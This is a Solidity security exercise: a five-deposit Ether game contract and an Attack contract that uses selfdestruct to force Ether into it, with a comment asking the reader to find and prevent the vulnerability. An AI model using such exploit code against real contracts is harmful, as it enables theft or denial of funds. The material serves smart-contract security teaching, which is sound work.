// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// The goal of this game is to be the 5th player to deposit 1 Ether.
// Players can deposit only 1 Ether at a time.
// Winner will be able to withdraw all Ether.

//There is a vulnerability in this contract that can be exploited using the Attack contract. Find and explain the vulnerability, and find the prevention for it. 

contract MyGame {
    uint public target = 5 ether;
    address public winner;
    uint public balance;
    // manually maintaining a balance that only updates when the deposit function is called
    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        balance += msg.value;
        // uint balance = address(this).balance;
        require(balance <= target, "Game is over");

        if (balance == target) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");
        
        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
        balance = 0;
    }
}

contract Attack {
    MyGame game;

    constructor(MyGame _game) {
        game = MyGame(_game);
    }

    function attack() public payable {
        address payable victim = payable(address(game));
        selfdestruct(victim);
    }
}